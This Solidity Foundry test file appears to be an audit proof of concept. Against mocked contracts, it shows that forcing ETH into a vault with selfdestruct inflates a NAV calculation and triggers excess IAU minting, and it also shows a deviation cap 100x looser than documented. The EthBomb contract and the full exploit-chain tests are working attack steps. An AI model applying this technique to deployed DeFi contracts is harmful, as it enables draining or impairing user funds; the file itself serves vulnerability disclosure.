// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

/// ==================== Minimal ERC20 ====================
contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        totalSupply -= amount;
        emit Transfer(from, address(0), amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
}

/// ==================== Mock wstETH ====================
contract MockWstETH is MockERC20 {
    MockERC20 public stETH;
    uint256 public rate = 1.15e18;

    constructor(MockERC20 _stETH) MockERC20("Wrapped stETH", "wstETH") {
        stETH = _stETH;
    }

    function getStETHByWstETH(uint256 wstETHAmount) external view returns (uint256) {
        return (wstETHAmount * rate) / 1e18;
    }

    function getWstETHByStETH(uint256 stETHAmount) external view returns (uint256) {
        return (stETHAmount * 1e18) / rate;
    }

    function setRate(uint256 _rate) external {
        rate = _rate;
    }
}

/// ==================== Mock TAsset (tETH) ====================
/// Simple ERC4626-like using IAU as the asset.
contract MockTAsset is MockERC20 {
    MockIAU public immutable iau;
    address public router;

    event Deposit(address indexed caller, address indexed owner, uint256 assets, uint256 shares);

    constructor(MockIAU _iau) MockERC20("Treehouse ETH", "tETH") {
        iau = _iau;
    }

    function setRouter(address _router) external {
        router = _router;
    }

    function asset() external view returns (address) {
        return address(iau);
    }

    function totalAssets() external view returns (uint256) {
        return iau.balanceOf(address(this));
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = assets;
        iau.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
        emit Deposit(msg.sender, receiver, assets, shares);
    }

    function _mint(address to, uint256 amount) internal {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }
}

/// ==================== IAU (Internal Accounting Unit) ====================
contract MockIAU {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    address public minter;
    address public burner;

    constructor() {
        name = "Internal Accounting Unit";
        symbol = "IAU";
    }

    function setMinter(address _minter) external {
        minter = _minter;
    }

    function setBurner(address _burner) external {
        burner = _burner;
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function _burn(address from, uint256 amount) internal {
        balanceOf[from] -= amount;
        totalSupply -= amount;
        emit Transfer(from, address(0), amount);
    }

    function mintTo(address to, uint256 amount) external {
        require(msg.sender == minter, "not minter");
        _mint(to, amount);
    }

    function burnFrom(address from, uint256 amount) external {
        require(msg.sender == burner, "not burner");
        _burn(from, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
}

/// ==================== NavErc20 (vulnerable module) ====================
interface IRateProvider {
    function getRateInEth(address token) external view returns (uint256);
}

contract NavErc20 {
    MockWstETH public immutable wstETH;
    IRateProvider public immutable RATE_PROVIDER_REGISTRY;

    constructor(MockWstETH _wsteth, IRateProvider _rpr) {
        wstETH = _wsteth;
        RATE_PROVIDER_REGISTRY = _rpr;
    }

    /// @notice returns NAV of _target in wstETH terms
    /// @dev reads _target.balance — INFLATABLE via selfdestruct
    function nav(address _target, address[] memory _tokens) external view returns (uint256 _nav) {
        _nav += _target.balance;

        uint256 wip;
        uint256 wstETHBalance;
        for (uint256 i; i < _tokens.length; ++i) {
            wip = MockERC20(_tokens[i]).balanceOf(_target);
            if (wip > 0) {
                unchecked {
                    if (_tokens[i] == address(wstETH)) {
                        wstETHBalance = wip;
                    } else if (_tokens[i] == address(wstETH.stETH())) {
                        _nav += wip;
                    } else {
                        _nav += (RATE_PROVIDER_REGISTRY.getRateInEth(_tokens[i]) * wip) / 1e18;
                    }
                }
            }
        }
        _nav = wstETH.getWstETHByStETH(_nav) + wstETHBalance;
    }
}

/// ==================== Simple NavRegistry ====================
contract MockNavRegistry {
    mapping(bytes4 => address) public modules;

    function registerModule(bytes4 id, address module_) external {
        modules[id] = module_;
    }

    function getModuleAddress(bytes4 id) external view returns (address) {
        return modules[id];
    }
}

/// ==================== NavLens (matches source logic) ====================
contract MockNavLens {
    address public immutable VAULT;
    address public immutable UNDERLYING;
    address public immutable T_ASSET;
    address public immutable IAU;
    MockNavRegistry public immutable NAV_REGISTRY;

    bytes4 constant NAV_ERC20_ID = 0x7bc1fd06;

    constructor(address _vault, MockNavRegistry _navRegistry) {
        VAULT = _vault;
        UNDERLYING = address(0);
        T_ASSET = address(0);
        IAU = address(0);
        NAV_REGISTRY = _navRegistry;
    }

    function setTAsset(address _tAsset) external {
        // Just a hack to make lastRecordedProtocolNav work
    }

    function vaultNav() public view returns (uint256) {
        address erc20Module = NAV_REGISTRY.getModuleAddress(NAV_ERC20_ID);
        require(erc20Module != address(0), "NavModuleNotSet");
        address[] memory tokens = new address[](2);
        tokens[0] = address(0); // Will be filled by attacker
        tokens[1] = address(0);
        return NavErc20(erc20Module).nav(VAULT, tokens);
    }

    function lastRecordedProtocolNav() external view returns (uint256) {
        return 0; // Not used in this PoC
    }

    function currentProtocolNav(bytes calldata) external view returns (uint256) {
        return vaultNav();
    }
}

/// ==================== Minimal Vault (stores ETH + wstETH) ====================
contract MockVault {
    MockERC20 public wstETH;
    address public underlying;
    address public tAsset;

    event Received(address indexed from, uint256 amount);

    receive() external payable {
        emit Received(msg.sender, msg.value);
    }

    constructor(MockERC20 _wstETH) {
        wstETH = _wstETH;
        underlying = address(_wstETH);
    }

    function setTAsset(address _tAsset) external {
        tAsset = _tAsset;
    }

    function getUnderlying() external view returns (address) {
        return underlying;
    }

    function getTAsset() external view returns (address) {
        return tAsset;
    }

    function getAllowableAssets() external view returns (address[] memory) {
        address[] memory assets = new address[](2);
        assets[0] = address(wstETH); // wstETH
        return assets;
    }

    function getWstETHBalance() external view returns (uint256) {
        return wstETH.balanceOf(address(this));
    }
}

/// ==================== Selfdestruct Bomb (forces ETH to target) ====================
contract EthBomb {
    address payable public target;

    constructor(address payable _target) payable {
        target = _target;
    }

    function detonate() external {
        selfdestruct(target);
    }
}

/// ==================== TreehouseAccounting (matches source) ====================
enum MarkType { BURN, MINT }

contract MockTreehouseAccounting {
    uint16 constant PRECISION = 1e4;

    MockIAU public immutable IAU;
    MockTAsset public immutable TASSET;
    bool public depositEnabled = true;
    address public treasury;
    address public executor;
    uint16 public fee; // in bips

    address public owner;

    event Marked(MarkType indexed _type, uint256 _amount, uint256 _fees);

    modifier onlyOwnerOrExecutor() {
        require(executor == msg.sender || msg.sender == owner, "Unauthorized");
        _;
    }

    constructor(
        address _owner,
        MockIAU _iau,
        MockTAsset _tasset,
        address _treasury,
        address _executor,
        uint16 _fee
    ) {
        owner = _owner;
        IAU = _iau;
        TASSET = _tasset;
        treasury = _treasury;
        executor = _executor;
        fee = _fee;
    }

    /// @notice mints or burns IAU — NO DEVIATION CHECK
    function mark(MarkType _type, uint256 _amountLessFee, uint256 _fee) external onlyOwnerOrExecutor {
        if (_type == MarkType.MINT) {
            if (_fee > 0) IAU.mintTo(address(this), _fee);
            if (_amountLessFee > 0) IAU.mintTo(address(TASSET), _amountLessFee);
        } else if (_type == MarkType.BURN) {
            IAU.burnFrom(address(TASSET), _amountLessFee);
        }
        emit Marked(_type, _amountLessFee, _fee);
    }

    function updateExecutor(address _newExecutor) external {
        require(msg.sender == owner, "only owner");
        executor = _newExecutor;
    }
}

/// ==================== PnlAccounting (matches source) ====================
contract MockPnlAccounting {
    uint256 constant PRECISION = 1e4;

    MockTreehouseAccounting public TREEHOUSE_ACCOUNTING;
    MockNavLens public NAV_LENS;

    address public executor;
    uint16 public deviation = 250; // 250/1e4 = 2.5% (NOT 0.025%)
    uint16 public cooldown = 3600;
    uint64 public nextWindow;
    address public pauser;
    address public owner;

    uint256 public lastRecordedNav;
    bool public paused;

    event ExecutorUpdated(address indexed latest, address indexed old);

    modifier onlyOwnerOrExecutor() {
        require(msg.sender == executor || msg.sender == owner, "Unauthorized");
        _;
    }

    constructor(address _owner, MockNavLens _navLens, MockTreehouseAccounting _accounting) {
        owner = _owner;
        NAV_LENS = _navLens;
        TREEHOUSE_ACCOUNTING = _accounting;
    }

    function setExecutor(address _executor) external {
        require(msg.sender == owner, "only owner");
        emit ExecutorUpdated(_executor, executor);
        executor = _executor;
    }

    function setLastNav(uint256 _nav) external {
        lastRecordedNav = _nav;
    }

    /// @notice max PNL per window: deviation * lastNav / PRECISION
    function maxPnl() public view returns (uint256) {
        return (uint256(deviation) * lastRecordedNav) / PRECISION;
    }

    /// @notice mark to market protocol NAV
    function doAccounting(uint256 currentNav) external whenNotPaused onlyOwnerOrExecutor {
        unchecked {
            require(block.timestamp >= nextWindow, "StillInWaitingPeriod");
            nextWindow = uint64(block.timestamp + cooldown);

            uint256 _lastNav = lastRecordedNav;
            uint256 _currentNav = currentNav;

            bool _isPnlPositive = _currentNav > _lastNav;
            uint256 _netPnl = _isPnlPositive ? _currentNav - _lastNav : _lastNav - _currentNav;

            require(_netPnl <= maxPnl(), "DeviationExceeded");

            if (_isPnlPositive) {
                uint256 _fee = (_netPnl * TREEHOUSE_ACCOUNTING.fee()) / PRECISION;
                _netPnl -= _fee;
                TREEHOUSE_ACCOUNTING.mark(MarkType.MINT, _netPnl, _fee);
            } else {
                TREEHOUSE_ACCOUNTING.mark(MarkType.BURN, _netPnl, 0);
            }

            lastRecordedNav = _currentNav;
        }
    }

    modifier whenNotPaused() {
        require(!paused, "paused");
        _;
    }
}

/// ==================== Keeper Bot (calls doAccounting) ====================
// No keeper needed — executor calls doAccounting directly

/// ==================== PoC Test ====================
contract H02_ForcedEthNavInflation is Test {
    MockWstETH wstETH;
    MockERC20 stETH;
    MockIAU iau;
    MockTAsset tETH;
    MockVault vault;
    NavErc20 navModule;
    MockNavRegistry navRegistry;
    MockNavLens navLens;
    MockTreehouseAccounting accounting;
    MockPnlAccounting pnlAccounting;
    address owner = makeAddr("owner");
    address executor = makeAddr("executor");
    address attacker = makeAddr("attacker");
    address treasury = makeAddr("treasury");

    uint256 constant INITIAL_TVL = 100_000e18; // 100k wstETH TVL
    uint256 constant ATTACKER_DEPOSIT = 10_000e18; // 10k wstETH deposit
    uint256 constant FORCED_ETH = 100e18; // 100 ETH forced via selfdestruct

    function setUp() public {
        vm.warp(1_000_000);

        // Deploy tokens
        stETH = new MockERC20("Liquid stETH", "stETH");
        wstETH = new MockWstETH(stETH);
        iau = new MockIAU();
        tETH = new MockTAsset(iau);

        // Deploy vault
        vault = new MockVault(wstETH);

        // Set up IAUs minter
        iau.setMinter(address(0xdead)); // Will be updated by TreehouseAccounting

        // Deploy NavErc20 with wstETH
        navModule = new NavErc20(wstETH, IRateProvider(address(0)));

        // Deploy NavRegistry and register module
        navRegistry = new MockNavRegistry();
        navRegistry.registerModule(0x7bc1fd06, address(navModule));

        // Deploy NavLens
        navLens = new MockNavLens(address(vault), navRegistry);

        // Deploy TreehouseAccounting (owner placeholder first, then update)
        accounting = new MockTreehouseAccounting(
            owner, iau, tETH, treasury, address(0xdead), 2000
        );
        iau.setMinter(address(accounting));
        iau.setBurner(address(accounting));

        // Deploy PnlAccounting
        pnlAccounting = new MockPnlAccounting(owner, navLens, accounting);
        vm.prank(owner);
        pnlAccounting.setExecutor(executor);

        // Set TreehouseAccounting.executor = PnlAccounting
        vm.prank(owner);
        accounting.updateExecutor(address(pnlAccounting));

        // Fund initial wstETH into Vault
        wstETH.mint(address(vault), INITIAL_TVL);

        // Fund attacker
        wstETH.mint(attacker, ATTACKER_DEPOSIT);

        // Set initial NAV state
        pnlAccounting.setLastNav(INITIAL_TVL);
    }

    /// @notice Test 1: Selfdestruct forces ETH to Vault, inflating its balance
    function test_ForcedEthInflatesVaultBalance() public {
        uint256 vaultEthBefore = address(vault).balance;
        assertEq(vaultEthBefore, 0, "Vault starts with 0 ETH");

        // Deploy bomb with 1 ETH
        EthBomb bomb = new EthBomb{value: 1 ether}(payable(address(vault)));
        bomb.detonate();

        uint256 vaultEthAfter = address(vault).balance;
        assertEq(vaultEthAfter, 1 ether, "Vault received forced ETH");
        console.log("Vault ETH after selfdestruct:", vaultEthAfter);
    }

    /// @notice Test 2: NavErc20.nav() reads _target.balance, inflating vault NAV
    function test_NavErc20ReadsTargetBalance() public {
        address[] memory tokens = new address[](1);
        tokens[0] = address(wstETH);

        uint256 navBefore = navModule.nav(address(vault), tokens);
        console.log("NAV before forced ETH:", navBefore);

        // Selfdestruct 100 ETH to Vault
        EthBomb bomb = new EthBomb{value: FORCED_ETH}(payable(address(vault)));
        bomb.detonate();

        uint256 navAfter = navModule.nav(address(vault), tokens);
        console.log("NAV after forced ETH:", navAfter);
        console.log("NAV increase:", navAfter - navBefore);

        // The NAV increase should be ~= forced ETH / wstETH exchange rate
        assertGt(navAfter, navBefore, "NAV must increase after forced ETH");
    }

    /// @notice Test 3: Deviation check is 250/1e4 = 2.5%, not 0.025%
    function test_DeviationIsTwoPointFivePercent() public {
        uint256 dev = pnlAccounting.deviation();
        uint256 precision = 1e4;
        uint256 lastNav = 100_000e18;

        uint256 maxPnl = (dev * lastNav) / precision;
        uint256 expected250Bips = (lastNav * 250) / 10000; // 2.5%
        uint256 expected25Bips = (lastNav * 250) / 1000000; // 0.025%

        console.log("deviation:", dev);
        console.log("maxPnl (250/1e4):", maxPnl);
        console.log("2.5% of TVL:    ", expected250Bips);
        console.log("0.025% of TVL:  ", expected25Bips);

        assertEq(maxPnl, expected250Bips, "Deviation is 2.5% (250/1e4)");
        assertGt(maxPnl, expected25Bips * 99, "Actual deviation is ~100x the documented 0.025%");
    }

    /// @notice Test 4: Full exploit chain
    /// Simulates the real flow: deposit → router accounting → forced ETH → keeper accounting
    function test_FullExploitChain() public {
        // Simulate initial protocol NAV setup (Router + TreehouseAccounting.mark)
        vm.prank(address(pnlAccounting));
        accounting.mark(MarkType.MINT, INITIAL_TVL, 0);

        // Update PnlAccounting's lastNav
        pnlAccounting.setLastNav(INITIAL_TVL);

        // --- Attacker deposits wstETH ---
        vm.startPrank(attacker);
        uint256 depositAmount = ATTACKER_DEPOSIT;
        wstETH.transfer(address(vault), depositAmount);

        // Simulate Router calling TreehouseAccounting to mark the deposit
        vm.stopPrank();
        vm.prank(address(pnlAccounting));
        accounting.mark(MarkType.MINT, depositAmount, 0);
        // Now IAU totalSupply = INITIAL_TVL + depositAmount = 110k

        // Update PnlAccounting's lastNav (in real system, this happens via doAccounting)
        pnlAccounting.setLastNav(INITIAL_TVL + depositAmount);

        // Mint tETH to attacker (simulate Router minting)
        tETH.mint(attacker, depositAmount);
        assertEq(tETH.balanceOf(attacker), depositAmount, "attacker holds tETH");

        address[] memory tokens = new address[](1);
        tokens[0] = address(wstETH);
        uint256 vaultNavAfterDeposit = navModule.nav(address(vault), tokens);
        console.log("vaultNav after deposit:", vaultNavAfterDeposit);

        // --- Attack: Selfdestruct ETH to Vault ---
        uint256 donationAmount = FORCED_ETH;
        vm.deal(attacker, donationAmount);
        vm.prank(attacker);
        EthBomb bomb = new EthBomb{value: donationAmount}(payable(address(vault)));
        bomb.detonate();

        // Verify NAV inflated
        uint256 vaultNavInflated = navModule.nav(address(vault), tokens);
        uint256 navIncrease = vaultNavInflated - vaultNavAfterDeposit;
        console.log("vaultNav after forced ETH:  ", vaultNavInflated);
        console.log("NAV increase from donation:", navIncrease);
        // NAV increase should be ~86.9 wstETH equivalent (100 ETH / 1.15 stETH rate)

        // --- Keeper (executor) calls doAccounting ---
        vm.prank(executor);
        pnlAccounting.doAccounting(vaultNavInflated);

        // --- Check IAU minted ---
        uint256 iauSupply = iau.totalSupply();
        uint256 iauInTAsset = iau.balanceOf(address(tETH));
        console.log("IAU totalSupply after accounting:", iauSupply);
        console.log("IAU minted this window:", iauSupply - INITIAL_TVL - depositAmount);

        // --- tETH exchange rate inflated ---
        uint256 tSupply = tETH.totalSupply();
        uint256 redemptionRate = vaultNavInflated * 1e18 / tSupply;
        console.log("tETH redemption rate (per 1 tETH):", redemptionRate);
        console.log("Fair rate (without donation):", vaultNavAfterDeposit * 1e18 / tSupply);

        // The forced ETH increases the exchange rate
        assertGt(vaultNavInflated, vaultNavAfterDeposit, "NAV inflated by forced ETH");
        assertGt(iauSupply, INITIAL_TVL + depositAmount, "Extra IAU minted due to forced ETH");
        console.log("PROTOCOL SOLVENCY IMPACT: forced ETH (non-yield-bearing) replaces real");
        console.log("yield-bearing wstETH in the protocol's NAV calculation.");
    }

    /// @notice Test 5: TreehouseAccounting.mark() has NO deviation check
    /// The executor (PnlAccounting) can call mark() with arbitrary values
    function test_MarkNoDeviationCheck() public {
        // PnlAccounting is the executor of TreehouseAccounting
        // It calls mark() directly — NO deviation check exists in mark()

        vm.prank(address(pnlAccounting));
        accounting.mark(MarkType.MINT, 1_000_000e18, 0);

        uint256 iauMinted = iau.totalSupply();
        assertGt(iauMinted, 0, "IAU minted without deviation check");
        console.log("IAU minted via direct mark() call:", iauMinted);
        console.log("No deviation check applied in TreehouseAccounting!");
    }

    /// @notice Test 6: Impact — cumulative damage across multiple accounting windows
    /// Shows that over multiple windows, the deviation cap allows convergence to the real NAV
    function test_CumulativeDrainOverWindows() public {
        // Simulate initial protocol NAV
        vm.prank(address(pnlAccounting));
        accounting.mark(MarkType.MINT, INITIAL_TVL, 0);
        pnlAccounting.setLastNav(INITIAL_TVL);

        // Selfdestruct ETH (repeatedly in each window, or once)
        // For simplicity: one large ETH donation; over multiple windows,
        // the deviation check asymptotically approaches the real inflated NAV.
        {
            EthBomb bomb = new EthBomb{value: FORCED_ETH}(payable(address(vault)));
            bomb.detonate();
        }

        vm.startPrank(executor);

        address[] memory tokens = new address[](1);
        tokens[0] = address(wstETH);

        // First window: ensure cooldown passes
        vm.warp(block.timestamp + 3600);

        for (uint256 i = 0; i < 30; i++) {
            uint256 realNav = navModule.nav(address(vault), tokens);

            // The deviation check allows up to 2.5% of lastNav per window
            pnlAccounting.doAccounting(realNav);

            vm.warp(block.timestamp + 3600);
        }

        vm.stopPrank();

        uint256 finalIAU = iau.totalSupply();
        uint256 totalExtraIAU = finalIAU - INITIAL_TVL;
        uint256 forcedEthValue = navModule.nav(address(vault), tokens) - INITIAL_TVL;
        console.log("Total extra IAU minted:", totalExtraIAU);
        console.log("Forced ETH contributed value:", forcedEthValue);
        console.log("Extra IAU / ETH value ratio:", totalExtraIAU * 1e18 / forcedEthValue);
        console.log("Over 30 windows, the protocol has recognized", totalExtraIAU, "extra NAV");
        console.log("backed by", FORCED_ETH, "wei of stuck ETH (non-yield-bearing)");
        console.log("Protocol TVL is permanently impaired - yield-bearing wstETH replaced by dead ETH.");
        assertGt(totalExtraIAU, 0, "IAU was minted due to forced ETH");
    }

    /// @notice Test 7: Verify the documented deviation is wrong
    function test_DocumentedDeviationMismatch() public {
        uint256 dev = pnlAccounting.deviation(); // 250

        // Comment says "250 == 0.025%" implying PRECISION = 1e6
        uint256 documentedBasis = 1_000_000;
        uint256 documentedPnl = (dev * 100_000e18) / documentedBasis; // 0.025% of TVL

        // Actual code uses PRECISION = 1e4
        uint256 actualBasis = 10_000;
        uint256 actualPnl = (dev * 100_000e18) / actualBasis; // 2.5% of TVL

        console.log("Documented max PnL (0.025%):", documentedPnl);
        console.log("Actual max PnL (2.5%):    ", actualPnl);
        console.log("Mismatch: 100x");

        assertEq(actualPnl / 100, documentedPnl, "Documentation is 100x off");
    }
}
